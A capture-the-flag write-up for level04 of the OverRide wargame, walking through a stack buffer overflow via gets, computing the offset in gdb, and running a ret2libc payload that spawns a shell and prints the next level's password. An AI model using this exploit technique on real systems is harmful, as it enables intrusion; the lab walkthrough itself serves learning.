# level04

## Header

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
```

<hr>

## Solution

From the [disassembled binary](./source.s) and the [source](./source.c) code we can see that program uses vulnerable `gets` call. This means we can perform `buffer overflow` to overwrite return address of `main` function.

<details>
  <summary> A few words about macroses </summary>

  To understand this part of disassembled code,
  ```asm
      ...
      mov    0x1c(%esp),%eax
      mov    %eax,0xa0(%esp)
      mov    0xa0(%esp),%eax
      and    $0x7f,%eax
      test   %eax,%eax
      je     0x80487ac <main+228>
      ; res & 7f == 0

      mov    0x1c(%esp),%eax
      mov    %eax,0xa4(%esp)
      mov    0xa4(%esp),%eax
      and    $0x7f,%eax
      add    $0x1,%eax
      sar    %al                  
      test   %al,%al
      jle    0x80487ba <main+242>
      ; ((res & 7f) + 1 >> 1) > 0
  ```

  we need to look at this header on the given system:
  ```bash
  $ find / -name 'waitstatus.h' 2>/dev/null
  /rofs/usr/include/x86_64-linux-gnu/bits/waitstatus.h
  ```

  Open `waitstatus.h` with any tool:
  ```c
  /* If WIFSIGNALED(STATUS), the terminating signal.  */
  #define __WTERMSIG(status)      ((status) & 0x7f)
  ...
  /* Nonzero if STATUS indicates normal termination.  */
  #define __WIFEXITED(status)     (__WTERMSIG(status) == 0)
  ...
  /* Nonzero if STATUS indicates termination by a signal.  */
  #define __WIFSIGNALED(status) \
    (((signed char) (((status) & 0x7f) + 1) >> 1) > 0)
  ```

From this file we can understand that macro `WIFEXITED` and `WIFSIGNALED` were used.

</details>


Let's look at this asm code thoroughly:
```c
main:
    push   %ebp
    mov    %esp,%ebp
    push   %edi
    push   %ebx
    and    $0xfffffff0,%esp     ; do nothing as the stack already aligned
    sub    $0xb0,%esp           ; 176 bytes allocated on stack

    ...
    lea    0x20(%esp),%ebx
```

Here is the proof that the stack already aligned:
```
(gdb) disas main
  ...
  0x080486cd <+5>:     and    $0xfffffff0,%esp
(gdb) b *0x080486cd
...
(gdb) x $esp
0xffffd700:     0xf7fceff4
(gdb) ni
0x080486d0 in main ()
(gdb) x $esp
0xffffd700:     0xf7fceff4
```

The stack looks like this:
```
EBP+0x4,  ESP+0xbc, return address
EBP+0x0,  ESP+0xb8, saved EBP
EBP-0x4,  ESP+0xb4, saved EDI
EBP-0x8,  ESP+0xb0, saved EBX
EBP-0x0c, ESP+0xac, pid
EBP-0x10, ESP+0xa8, ptrace' return
EBP-0x14, ESP+0xa4, s2
EBP-0x18, ESP+0xa0, s1
...
EBP-0x98, ESP+0x20, buf[32]
EBP-0x9c, ESP+0x1c, status
...
EBP-0xb8, ESP+0x0,  end of frame
```

The buffer starts at `ESP+0x20` and the top of the stack at `EBP-0xb8` or `ESP`. <br>
To overwrite return address we need to pass 0x98 + 0x4 bytes for EBP + 0x4 bytes address <br>
= 156 bytes of padding and 4 bytes of return address.

Let's use `ret2libc` attack to exploit the binary.

Finding out the address of `system` call and `/bin/sh` string:
```
(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) r
Starting program: /home/users/level04/level04
Breakpoint 1, 0x080486cd in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc map
  ...
  Start Addr   End Addr       Size     Offset objfile
  ...
  0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
  ...
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:      "/bin/sh"
```

Now, we have all the data to exploit:
```bash
level04@OverRide:~$ python -c 'print "X" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "XXXX" + "\xf7\xf8\x97\xec"[::-1]' > /tmp/payload
level04@OverRide:~$ cat /tmp/payload - | ./level04 
Give me some shellcode, k
whoami
level05
cd ../level05
ls -la
total 17
dr-xr-x---+ 1 level05 level05   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level05 level05  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level05 level05 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level06 users   5176 Sep 10  2016 level05
-rw-r--r--+ 1 level05 level05   41 Oct 19  2016 .pass
-rw-r--r--  1 level05 level05  675 Sep 10  2016 .profile
cat .pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

## References
- [ret2libc](https://wiki.bi0s.in/pwning/return2libc/return-to-libc/)
- [man wait](https://man7.org/linux/man-pages/man2/wait.2.html)
- [man prctl](https://man7.org/linux/man-pages/man2/prctl.2.html)
- [man ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html)
